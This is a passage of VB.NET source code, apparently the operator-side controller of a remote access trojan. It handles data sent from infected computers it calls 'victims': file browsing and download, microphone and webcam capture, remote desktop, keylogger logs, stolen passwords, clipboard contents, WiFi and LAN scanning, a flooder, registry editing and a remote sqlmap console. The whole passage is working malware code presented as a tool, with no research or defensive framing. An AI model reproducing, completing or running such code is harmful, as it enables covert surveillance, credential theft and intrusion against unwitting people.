                            ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Then
                                itm.ImageIndex = 35
                            ElseIf itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Then
                                itm.ImageIndex = 36
                            ElseIf itm.Text.EndsWith(".resx") Or itm.Text.EndsWith(".RESX") Then
                                itm.ImageIndex = 37
                            ElseIf itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".CONFIG") Then
                                itm.ImageIndex = 38
                            ElseIf itm.Text.EndsWith(".vbproj") Or itm.Text.EndsWith(".VBPROJ") Then
                                itm.ImageIndex = 39
                            ElseIf itm.Text.EndsWith(".settings") Or itm.Text.EndsWith(".SETTINGS") Then
                                itm.ImageIndex = 40
                            ElseIf itm.Text.EndsWith(".user") Or itm.Text.EndsWith(".USER") Or itm.Text.EndsWith(".suo") Or itm.Text.EndsWith(".SUO") Then
                                itm.ImageIndex = 41
                            ElseIf itm.Text.EndsWith(".pdb") Or itm.Text.EndsWith(".PDB") Then
                                itm.ImageIndex = 42
                            ElseIf itm.Text.EndsWith(".xslt") Or itm.Text.EndsWith(".XSLT") Then
                                itm.ImageIndex = 43
                            ElseIf itm.Text.EndsWith(".obj") Or itm.Text.EndsWith(".OBJ") Then
                                itm.ImageIndex = 44
                            ElseIf itm.Text.EndsWith(".rc") Or itm.Text.EndsWith(".RC") Then
                                itm.ImageIndex = 45
                            ElseIf itm.Text.EndsWith(".inc") Or itm.Text.EndsWith(".INC") Or itm.Text.EndsWith(".lst") Or itm.Text.EndsWith(".LST") Then
                                itm.ImageIndex = 46
                            ElseIf itm.Text.EndsWith(".res") Or itm.Text.EndsWith(".RES") Then
                                itm.ImageIndex = 47
                            ElseIf itm.Text.EndsWith(".mdmp") Or itm.Text.EndsWith(".MDMP") Then
                                itm.ImageIndex = 48
                            ElseIf itm.Text.EndsWith(".ResmonCfg") Or itm.Text.EndsWith(".RESMONCFG") Then
                                itm.ImageIndex = 49
                            ElseIf itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".CONF") Or itm.Text.EndsWith(".leases") Or itm.Text.EndsWith(".LEASES") Then
                                itm.ImageIndex = 50
                            ElseIf itm.Text.EndsWith(".cur") Or itm.Text.EndsWith(".CUR") Then
                                itm.ImageIndex = 51
                            ElseIf itm.Text.EndsWith(".ani") Or itm.Text.EndsWith(".ANI") Then
                                itm.ImageIndex = 52
                            ElseIf itm.Text.EndsWith(".url") Or itm.Text.EndsWith(".URL") Then
                                itm.ImageIndex = 53
                            ElseIf itm.Text.EndsWith(".ttf") Or itm.Text.EndsWith(".TTF") Or itm.Text.EndsWith(".otf") Or itm.Text.EndsWith(".OTF") Then
                                itm.ImageIndex = 54
                            ElseIf itm.Text.EndsWith(".blend") Or itm.Text.EndsWith(".BLEND") Then
                                itm.ImageIndex = 55
                            ElseIf itm.Text.EndsWith(".icc") Or itm.Text.EndsWith(".ICC") Then
                                itm.ImageIndex = 56
                            ElseIf itm.Text.EndsWith(".a3x") Or itm.Text.EndsWith(".A3X") Or itm.Text.EndsWith(".au3") Or itm.Text.EndsWith(".AU3") Then
                                itm.ImageIndex = 57
                            Else
                                itm.ImageIndex = 8
                            End If
                            fff.ListView1.Items.Add(itm)
                            i += 1

                        Next
                        My.Computer.Audio.Play("C:\Windows\Media\Windows Navigation Start.wav", AudioPlayMode.Background)

                    End If
                Case "getpath"
                    Dim fff As FileManager = My.Application.OpenForms("\\" & sock)
                    fff.TextBox1.Text = A(1)
                    S.Send(sock, "FileManager" & Yy & A(1))
                Case "micready"
                    If My.Application.OpenForms("mic" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cap As New MIC
                    cap.sock = sock
                    cap.Name = "mic" & sock
                    cap.Label2.Text &= " " & S.IP(sock)
                    cap.Focus()
                    cap.Show()

                Case "sendinformation"

                    If My.Application.OpenForms("Information" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim info As New Computer_Information
                    info.sock = sock
                    info.Name = "Information" & sock
                    info.Text = info.Text & " " & S.IP(sock)
                    'information
                    info.ListView1.Items.Add("Victime Name : " & A(30), 0)
                    info.ListView1.Items.Add("Local Ip Address : " & S.IP(sock), 4)
                    info.ListView1.Items.Add("Port : " & A(21), 8)
                    info.ListView1.Items.Add("Version : " & A(8), 9)
                    info.ListView1.Items.Add("Ping : " & pinger & " ms", 10)
                    info.ListView1.Items.Add("Server Path : " & A(22), 11)
                    'user information
                    info.ListView2.Items.Add("Username : " & A(2), 0)
                    info.ListView2.Items.Add("Country : " & A(5), 12)
                    info.ListView2.Items.Add("Language : " & A(19), 13)
                    info.ListView2.Items.Add("Antivirus : " & A(6), 14)
                    info.ListView2.Items.Add("Webcam : " & A(9), 7)
                    info.ListView2.Items.Add("Active Window : " & A(10), 15)
                    info.ListView2.Items.Add("Local Time : " & A(11), 16)
                    info.ListView2.Items.Add("Computer Start Time : " & A(12), 17)
                    info.ListView2.Items.Add("Current Directory : " & A(13), 18)
                    info.ListView2.Items.Add("Command Line : " & A(20), 19)
                    info.ListView2.Items.Add("System Directory : " & A(14), 20)
                    info.ListView2.Items.Add("User Domain Name : " & A(15), 0)
                    info.ListView2.Items.Add("User Interactive : " & A(16), 21)
                    info.ListView2.Items.Add("Working Set : " & A(17), 22)
                    'Extra information
                    info.ListView3.Items.Add("Computer Name : " & A(1), 1)
                    info.ListView3.Items.Add("Operating System : " & A(3), 6)
                    info.ListView3.Items.Add("Operating System Platform : " & A(4), 6)
                    info.ListView3.Items.Add("Operating System version : " & A(18), 23)
                    info.ListView3.Items.Add("RAM : " & A(7), 24)
                    info.ListView3.Items.Add("Processor Name : " & A(23), 25)
                    info.ListView3.Items.Add("Identifier : " & A(24), 26)
                    info.ListView3.Items.Add("System Product : " & A(25), 27)
                    info.ListView3.Items.Add("BIOS Release Date : " & A(26), 28)
                    info.ListView3.Items.Add("BIOS Version : " & A(27), 29)
                    info.ListView3.Items.Add("System Manufacturer : " & A(28), 30)
                    info.ListView3.Items.Add("BIOS Vendor : " & A(29), 31)


                    info.Label2.Text &= "  " & S.IP(sock)
                    info.Show()
                    pinger = 0


                Case "listenrec"
                    getfolder(sock)

                    IO.File.WriteAllBytes(DownloadMICFolder & tictoc & ".wav", Convert.FromBase64String(A(1)))

                    My.Computer.Audio.Play(DownloadMICFolder & tictoc & ".wav", AudioPlayMode.WaitToComplete)
                Case "recording"
                    Dim F As MIC = My.Application.OpenForms("mic" & sock)
                    If F IsNot Nothing Then

                        F.recording = True
                        F.Button4.Enabled = False
                        F.Button1.Enabled = True
                        Exit Sub

                    End If
                Case "recstop"
                    Dim F As MIC = My.Application.OpenForms("mic" & sock)
                    If F IsNot Nothing Then
                        F.recording = False
                        ' F.BlackShadesNetForm1.Text = "Remote Desktop  : " & S.IP(sock) & "Size: " & siz(b.Length) & " ,No Changes"
                        F.Button4.Enabled = True
                        F.Button1.Enabled = False
                        S.Send(sock, "listenrecord")
                        Exit Sub
                    End If
                Case "downloadedfile"
                    Dim fff As FileManager = My.Application.OpenForms("\\" & sock)

                    Try
                        IO.File.WriteAllBytes((fff.DownloadVictimFolder) & A(2), Convert.FromBase64String(A(1)))

                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try
                    fff.ListView2.Items.Add("_+ (" + fff.ListView1.Items.Item(fff.ListView1.FocusedItem.Index).SubItems.Item(0).Text & ") (Size " + fff.ListView1.Items.Item(fff.ListView1.FocusedItem.Index).SubItems.Item(1).Text + ")")
                    For Each Process As ListViewItem In fff.ListView2.Items
                        If Process.Text.Contains("_+ (") Then

                            Process.ForeColor = Color.DodgerBlue

                            Process.ImageIndex = 0

                        End If
                    Next

                    Thread.Sleep(1000)

                Case "viewimage"
                    Dim fff As FileManager = My.Application.OpenForms("\\" & sock)

                    If A(1) = "Error" Then
                        MsgBox("You cannot access this path", MsgBoxStyle.Exclamation)
                        fff.back()

                    Else

                        Dim picbyte() As Byte = Convert.FromBase64String(A(1))
                        Dim ms As New IO.MemoryStream(picbyte)
                        fff.pic1.Image = Image.FromStream(ms)





                    End If

                Case "@@" '
                    Dim BB As Byte() = fx(B, "@@" & Yy)(1)
                Case "!"
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cap As New Desktop
                    cap.F = Me
                    cap.Sock = sock
                    cap.Name = "!" & sock
                    cap.Sz = New Size(A(1), A(2))
                    cap.Label3.Text &= " " & S.IP(sock)

                    cap.Focus()
                    cap.Show()
                Case "@"
                    Dim F As Desktop = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If A(1).Length = 1 Then
                            ' F.BlackShadesNetForm1.Text = "Remote Desktop  : " & S.IP(sock) & "Size: " & siz(b.Length) & " ,No Changes"
                            If F.Button1.Text = "Stop" Then
                                S.Send(sock, "@" & Yy & F.c1.SelectedIndex & Yy & F.c2.Text & Yy & F.c.Value)
                            End If
                            Exit Sub
                        End If

                        Dim BB As Byte() = fx(newBytes, "@" & Yy)(1)
                        F.PktToImage(BB)
                    End If


                Case "camlist"

                    Try

                        Dim f As Cam = My.Application.OpenForms("cam" & sock)
                        If f Is Nothing Then
                            If Me.InvokeRequired Then
                                Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                                Exit Sub
                            End If
                            f = New Cam
                            f.Name = "cam" & sock
                            f.sock = sock
                            For i As Integer = 1 To A.Length - 1
                                f.SkyDarkCombo1.Items.Add(A(i))
                            Next
                            f.Label3.Text &= " " & S.IP(sock)
                            f.Show()

                        End If
                    Catch ex As Exception
                        MsgBox("Cam " & ex.Message)
                    End Try

                Case "cam"

                    Try

                        Dim f As Cam = My.Application.OpenForms("cam" & sock)
                        If f IsNot Nothing Then
                            If A.Length = 2 Then
                                Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                                SyncLock f.PictureBox1
                                    f.PictureBox1.Image = Image.FromStream(m)
                                End SyncLock
                            Else

                            End If
                        End If
                    Catch ex As Exception
                        MsgBox("Cam Image : " & ex.Message)
                    End Try

                Case "ProcessManager"

                    Dim fProc As ProcessManager = My.Application.OpenForms("OpenPro" & sock)
                    Dim allProcess As String() = Split(A(1), "ProcessSplit") 'Message.Substring(15).Split("ProcessSplit")
                    For i = 0 To allProcess.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allProcess(i)
                        itm.SubItems.Add(allProcess(i + 1))
                        itm.SubItems.Add(allProcess(i + 2))
                        itm.SubItems.Add(allProcess(i + 3))
                        itm.ImageIndex = 0
                        fProc.ListView1.Items.Add(itm)
                        i += 3
                    Next
                    fProc.ListView1.FindItemWithText(A(2).Replace("Me", "")).BackColor = Color.Salmon
                    ' fProc.ListView1.FindItemWithText(A(2)).ForeColor = Color.DarkOliveGreen

                Case "OpenPro"

                    If My.Application.OpenForms("OpenPro" & sock) IsNot Nothing Then Exit Sub

                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New ProcessManager
                    f.sock = sock
                    f.Name = "OpenPro" & sock
                    'f.Text = f.Text & " | " & A(1)
                    f.Label3.Text &= " " & S.IP(sock)
                    f.Show()


                Case "recvcli"
                    Dim f As ClipBoard = My.Application.OpenForms("clipss" & sock)
                    f.TextBox1.Text = A(1)
                Case "clipimg"
                    Dim f As ClipBoard = My.Application.OpenForms("clipss" & sock)
                    Dim pi As New PictureBox
                    Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                    SyncLock pi
                        pi.Image = Image.FromStream(m)
                        f.PictureBox1.Image = pi.Image
                    End SyncLock
                Case "clipss"
                    Dim f As ClipBoard = My.Application.OpenForms("clipss" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New ClipBoard
                        f.sock = sock
                        f.Name = "clipss" & sock

                        ' f.Text = "Get ClipBoard" & " - " & S.IP(xxx)
                        f.Show()
                    End If

                Case "wifi"
                    If My.Application.OpenForms("wifi" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Routers
                    f.sock = sock
                    f.Name = "wifi" & sock
                    f.Text = "WiFi Networks View For  : " & S.IP(sock)
                    f.Label2.Text &= " " & S.IP(sock)
                    f.Show()



                Case "wifi3"

                    Try
                        Dim F As Routers = My.Application.OpenForms("wifi" & sock)

                        Dim network As New ListViewItem
                        network.Text = (A(1))
                        Dim signal As Integer = Integer.Parse(A(2).Replace("%", ""))
                        If signal > 0 AndAlso signal < 15 Then
                            network.ImageIndex = 0
                        End If
                        If signal > 15 AndAlso signal < 35 Then
                            network.ImageIndex = 1
                        End If
                        If signal > 35 AndAlso signal < 50 Then
                            network.ImageIndex = 2
                        End If
                        If signal > 50 AndAlso signal < 65 Then
                            network.ImageIndex = 3
                        End If
                        If signal > 65 AndAlso signal < 80 Then
                            network.ImageIndex = 4
                        End If
                        If signal >= 80 AndAlso signal < 100 Then
                            network.ImageIndex = 5
                        End If
                        network.SubItems.Add(A(2))
                        network.SubItems.Add(A(3))
                        network.SubItems.Add(A(4))
                        F.ListView1.Items.Add(network)

                        F.Doublekiller()
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try

                Case "wifierror"
                    MsgBox(A(1))
                Case "openkl"
                    If My.Application.OpenForms("openkl" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New keylogger
                    f.sock = sock
                    f.Name = "openkl" & sock
                    f.Text = f.Text & S.IP(sock)
                    f.Label3.Text &= " " & S.IP(sock)
                    f.Show()
                    ' Case "logf"
                    '    Dim F As Form7 = My.Application.OpenForms("openlo" & sock)
                    '   Dim logsf As String() = Split(A(1), "|")
                    '  For i As Integer = 0 To logsf.Length - 2
                    'Dim ii As New ListViewItem
                    'ii.Text = logsf(i)
                    'f.ListView1.Items.Add(ii)
                    'Next

                Case "getlogs"
                    Dim F As keylogger = My.Application.OpenForms("openkl" & sock)
                    F.TextBox1.Text = A(1)
                    If F.Button1.Enabled = True Then
                        F.onlinetext.Text = A(1)

                    End If
                Case "hotspot"
                    If My.Application.OpenForms("hotspot" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New hotspot
                    f.sock = sock
                    f.Name = "hotspot" & sock
                    f.Text &= S.IP(sock)
                    f.Label3.Text &= " " & S.IP(sock)
                    f.Show()
                Case "hotspotok"
                    Dim F As hotspot = My.Application.OpenForms("hotspot" & sock)
                    F.Label7.ForeColor = Color.Lime
                    F.Label7.Text = "On"
                Case "hotspotoff"
                    Dim F As hotspot = My.Application.OpenForms("hotspot" & sock)
                    F.Label7.ForeColor = Color.Red
                    F.Label7.Text = "Off"
                Case "rarsql"
                    S.Send(sock, "unrarsql")
                Case "showinfo"
                    If My.Application.OpenForms("devices" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New DeviceManagerForm
                    f.sock = sock
                    f.Name = "devices" & sock
                    '  f.Text = "Devices And Printers For : " & S.IP(sock)
                    f.Label3.Text &= "  " & S.IP(sock)
                    f.Show()

                Case "printer"
                    Dim F As DeviceManagerForm = My.Application.OpenForms("devices" & sock)

                    If A(1).Contains("XPS") Or A(1).Contains("Xps") Or A(1).Contains("xps") Then
                        F.ListView2.Items.Add(A(1), 11)
                    ElseIf A(1).Contains("PDF") Or A(1).Contains("Pdf") Or A(1).Contains("pdf") Then
                        F.ListView2.Items.Add(A(1), 12)
                    Else
                        F.ListView2.Items.Add(A(1), 1)
                    End If
                Case "cputemp"
                    Dim F As DeviceManagerForm = My.Application.OpenForms("devices" & sock)

                    F.Label4.Text = A(1)
                Case "nonworkingdevice"
                    Dim F As DeviceManagerForm = My.Application.OpenForms("devices" & sock)
                    Dim device As New ListViewItem
                    F.ListView3.SmallImageList = F.ImageList1
                    If A(1).Contains("USB") Or A(1).Contains("Usb") Or A(1).Contains("usb") Then
                        device.ImageIndex = 3
                    ElseIf A(1).Contains("Bluetooth") Or A(1).Contains("BLUETOOTH") Or A(1).Contains("tooth") Then
                        device.ImageIndex = 4


                    ElseIf A(1).Contains("Wireless") Or A(1).Contains("WiFi") Or A(1).Contains("Wifi") Or A(1).Contains("wifi") Or A(1).Contains("Wi-Fi") Then
                        device.ImageIndex = 5

                    ElseIf A(1).Contains("Intel") Then
                        device.ImageIndex = 7
                    ElseIf A(4).Contains("video") Or A(4).Contains("Video") Then
                        device.ImageIndex = 8
                    ElseIf A(5).Contains("Audio") Or A(5).Contains("audio") Then
                        device.ImageIndex = 9
                    ElseIf A(5).Contains("Touch") Or A(5).Contains("touch") Then
                        device.ImageIndex = 10
                    Else
                        device.ImageIndex = 0
                    End If
                    device.Text = A(1)
                    device.SubItems.Add(A(2))
                    device.SubItems.Add(A(3))
                    device.SubItems.Add(A(4))
                    device.SubItems.Add(A(5))
                    F.ListView3.Items.Add(device)
                Case ("device")
                    Try

                    Catch ex As Exception

                    End Try
                    Dim F As DeviceManagerForm = My.Application.OpenForms("devices" & sock)
                    ' Dim allDevices As String() = Split(A(1), "|D|")


                    Dim device As New ListViewItem
                    F.ListView1.SmallImageList = F.ImageList1
                    If A(1).Contains("USB") Or A(1).Contains("Usb") Or A(1).Contains("usb") Then
                        device.ImageIndex = 3
                    ElseIf A(1).Contains("Bluetooth") Or A(1).Contains("BLUETOOTH") Or A(1).Contains("tooth") Then
                        device.ImageIndex = 4


                    ElseIf A(1).Contains("Wireless") Or A(1).Contains("WiFi") Or A(1).Contains("Wifi") Or A(1).Contains("wifi") Or A(1).Contains("Wi-Fi") Then
                        device.ImageIndex = 5

                    ElseIf A(1).Contains("Intel") Then
                        device.ImageIndex = 7
                    ElseIf A(4).Contains("video") Or A(4).Contains("Video") Then
                        device.ImageIndex = 8
                    ElseIf A(5).Contains("Audio") Or A(5).Contains("audio") Then
                        device.ImageIndex = 9
                    ElseIf A(5).Contains("Touch") Or A(5).Contains("touch") Then
                        device.ImageIndex = 10
                    Else
                        device.ImageIndex = 0
                    End If
                    device.Text = A(1)
                    device.SubItems.Add(A(2))
                    device.SubItems.Add(A(3))
                    device.SubItems.Add(A(4))
                    device.SubItems.Add(A(5))
                    F.ListView1.Items.Add(device)
                    'SmileFaces()
                Case "chatback"
                    'MessageBox.Show("New cht message ", "Victim Replied ", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Dim Ff As chat = My.Application.OpenForms("Chat" & sock)
                    Ff.TextBox1.Text &= "Victim Said:-" & A(1)
                    Ff.Sm()
                    ' Ff.SmileFaces("Victim Said :- " & A(1))
                    '  Invoke(New chatappd(AddressOf chatappds), A(1))
                    Exit Sub

                Case "pdataready"

                    If My.Application.OpenForms("pdata" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Process_Watcher
                    f.sock = sock
                    f.Name = "pdata" & sock
                    f.Label3.Text &= " " & S.IP(sock)
                    f.Show()
                Case "pdata"
                    Dim F As Process_Watcher = My.Application.OpenForms("pdata" & sock)
                    Dim Richx As New RichTextBox
                    Richx.Text = A(1)

                    For i As Integer = 0 To Richx.Lines.Length
                        Try
                            Dim FileLine As String = Richx.Lines(i)
                            Dim FileData As String() = Split(FileLine, "|/\|")
                            Dim Filelist As New ListViewItem
                            Filelist.Text = FileData(0) + ".exe"
                            If FileData(0).Equals("System") Then
                                Filelist.ImageIndex = 3
                            ElseIf FileData(0).Equals("idle") Then
                                Filelist.ImageIndex = 1
                            ElseIf FileData(0).Equals("Host") Then
                                Filelist.ImageIndex = 4
                            ElseIf FileData(0).Contains("DUC") Then
                                Filelist.ImageIndex = 12
                            ElseIf FileData(0).Contains("fox") Or FileData(0).Contains("Fox") Then
                                Filelist.ImageIndex = 8
                            ElseIf FileData(0).Contains("COM Surr") Then
                                Filelist.ImageIndex = 6
                            ElseIf FileData(0).Equals("iexplore") Then
                                Filelist.ImageIndex = 9
                            ElseIf FileData(0).Equals("conhost") Then
                                Filelist.ImageIndex = 11
                            ElseIf FileData(0).Equals("chrome") Or FileData(0).Equals("Chrome") Then
                                Filelist.ImageIndex = 10
                            ElseIf FileData(0).Contains("explorer") Or FileData(0).Equals("explorer") Then
                                Filelist.ImageIndex = 2
                            Else
                                Filelist.ImageIndex = 0
                            End If
                            If FileData(1).Equals("[") Or FileData(1).Contains("[") Or FileData(1).Equals("]") Or FileData(1).Contains("]") Then
                                Filelist.SubItems.Add("Unknowen IP V6")
                            Else
                                Filelist.SubItems.Add(FileData(1))
                            End If
                            Filelist.SubItems.Add(FileData(2))
                            If FileData(3).Equals("[") Or FileData(3).Contains("[") Or FileData(3).Equals("]") Or FileData(3).Contains("]") Then
                                Filelist.SubItems.Add("Unknowen IP V6")
                            Else
                                Filelist.SubItems.Add(FileData(3))
                            End If

                            Filelist.SubItems.Add(FileData(4))
                            Filelist.SubItems.Add(FileData(5))
                            Filelist.SubItems.Add(FileData(6))
                            F.ListView1.Items.Add(Filelist)
                        Catch ex As Exception

                        End Try
                        


                    Next
                Case "SendpData"
                    MsgBox("Client exception handled , Cannot find Grabber in client PC please right click , rechoose Connection watcher option")
                Case "ss"
                    If My.Application.OpenForms("ss" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New ServiceController
                    f.sock = sock
                    f.Name = "ss" & sock
                    f.Label3.Text &= " " & S.IP(sock)
                    f.Show()
                Case "serrrrr"
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If
                    Dim fProc As ServiceController = My.Application.OpenForms("ss" & sock)

                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then


                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(1))

                            itm.SubItems.Add(xx(2))
                            itm.SubItems.Add(xx(3))

                            itm.ImageIndex = 0
                            fProc.ListView1.Items.Add(itm)

                        End If
                    Next
                Case "readytochat"
                    If My.Application.OpenForms("Chat" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New chat
                    fm.sock = sock
                    fm.Name = "Chat" & sock
                    fm.Text = fm.Text & " " & S.IP(sock)
                    fm.Label2.Text &= " " & S.IP(sock)
                    fm.Show()
                Case "openRG"

                    Dim regedit As Registry_Editor = My.Application.OpenForms("regedit" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim regediti As New Registry_Editor
                    regediti.Name = "regedit" & sock
                    regediti.sock = sock
                    ' regediti.Text = "regeditistry" & " - " & S.IP(xxx)
                    regediti.Label2.Text &= " " & S.IP(sock)

                    regediti.Show()
                Case "RRSSRRSS"
                    Try
                        If My.Application.OpenForms("viewlan" & sock) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {sock, B})
                            Exit Sub
                        End If
                        Dim f As New Lan
                        f.sock = sock
                        f.Name = "viewlan" & sock
                        f.Text = "Lan View For : " & S.IP(sock)
                        f.Label2.Text &= "  " & S.IP(sock)


                        f.Show()


                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try
                Case "FLOOD"

                    Dim f As Flooder = My.Application.OpenForms("FLOOD" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New Flooder
                        f.sock = sock
                        f.Name = "FLOOD" & sock
                        '  f.Text += " | " & A(1)
                        f.Label2.Text &= " " & S.IP(sock)
                        f.Show()
                    End If

                Case "getlan"

                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    Dim PCX As String = A(1).ToUpper

                    If LanCurrentVictim.Contains(PCX) Then
                        F.ListView1.Items.Add(A(1), ReturnIndexLan(ReturnOS(LanCurrentVictim)))
                        F.ListView3.Items.Add(A(1) + "Alive", 1)
                    ElseIf A(1).Equals(Firewall) Then
                        F.ListView1.Items.Add(A(1), 0)

                    ElseIf A(1).Equals(Firewall) = False And A(1).Contains(LanCurrentVictim.Substring(0, 3)) = False Then
                        Dim l1 = F.ListView1.Items.Add(A(1))
                        F.ListView3.Items.Add(A(1) + "Alive", 1)
                        l1.ImageIndex = 6
                    End If








                Case "pcip"
                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    F.Label1.Text = A(1)

                Case "lanresults"
                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    If A(1).Contains("open") Then
                        Dim l1 = F.ListView2.Items.Add(A(1), 1)

                    Else
                        Dim l1 = F.ListView2.Items.Add(A(1), 0)

                    End If

                Case "gateway"


                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)

                    If A(1).Contains("0.0.0") Or A(1) = "" Then
                    Else
                        Firewall = A(1)
                        F.ListView1.Items.Add(A(1), 5)
                        F.ListView1.Items.Add("", 8)
                        F.ListView3.Items.Add("Gateway : " + A(1), 2)
                    End If



                    '   F.Doublekiller()
                Case "RG"
                    Dim regedit As Registry_Editor = My.Application.OpenForms("regedit" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Select Case A(1)
                        Case "~"
                            regedit.RGk.Enabled = True
                            regedit.RGLIST.Enabled = True
                            regedit.RGk.SelectedNode.Nodes.Clear()
                            regedit.RGLIST.Items.Clear()
                            regedit.pr.Value = 0
                            regedit.pr.Maximum = (A.Length - 3)
                            Dim num20 As Integer = (A.Length - 1)
                            Dim i As Integer = 3
                            Do While (i <= num20)
                                Try
                                    regedit.pr = regedit.pr
                                    regedit.pr.Value += 1
                                    If (A(i).Length > 0) Then
                                        If A(i).Contains("/") Then
                                            Dim strArray2 As String() = Strings.Split(A(i), "/", -1, CompareMethod.Binary)
                                            Dim item As ListViewItem = regedit.RGLIST.Items.Add(strArray2(0))
                                            item.SubItems.Add(strArray2(1))
                                            Try
                                                item.SubItems.Add(strArray2(2))
                                            Catch exception17 As Exception

                                                Dim exception3 As Exception = exception17

                                            End Try
                                            If (strArray2(1) = "String") Then
                                                item.ImageIndex = 1
                                            Else
                                                item.ImageIndex = 2
                                            End If
                                        Else
                                            regedit.RGk.SelectedNode.Nodes.Add(A(i))
                                        End If
                                    End If
                                Catch exception18 As Exception

                                    Dim exception4 As Exception = exception18

                                End Try
                                i += 1
                            Loop
                            regedit.RGk.SelectedNode.Expand()
                            regedit.RGk.Select()
                            regedit.RGk.Focus()
                            Dim num21 As Integer = (regedit.RGLIST.Columns.Count - 1)
                            Dim j As Integer = 0
                            Do While (j <= num21)
                                regedit.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                j += 1
                            Loop
                            regedit.pr.Value = 0

                            Exit Select

                            'new case Start 



                    End Select
                Case "openpw"
                    If My.Application.OpenForms("openpw" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim pw As New passwords
                    pw.sock = sock
                    pw.Name = "openpw" & sock
                    pw.Label3.Text &= " " & S.IP(sock)
                    pw.Show() 'Open pass

                Case "givepassx"

                    Dim pw As passwords = My.Application.OpenForms("openpw" & sock)

                    pw.RichTextBox1.Text = (A(1))
                    pw.ListView1.Items.Clear()
                    pw.Return_To_List()

                Case "sqlrss"
                    If My.Application.OpenForms("sqlrs" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cmd As New sqlmap
                    cmd.sock = sock
                    cmd.Name = "sqlrs" & sock
                    '  cmd.Text = cmd.T2.Text
                    cmd.Label3.Text &= " " & S.IP(sock)
                    cmd.Show() 'Open Sqlmap

                Case "sqlrs"
                    Dim shl2 As sqlmap = My.Application.OpenForms("sqlrs" & sock)
                    If (Not shl2 Is Nothing) Then
                        Dim box As RichTextBox = shl2.T1
                        SyncLock box
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.AppendText((DEB(A(1).Replace(ChrW(13) & ChrW(10), "")) & ChrW(13) & ChrW(10)))
                            shl2.T1.SelectionStart = shl2.T1.TextLength
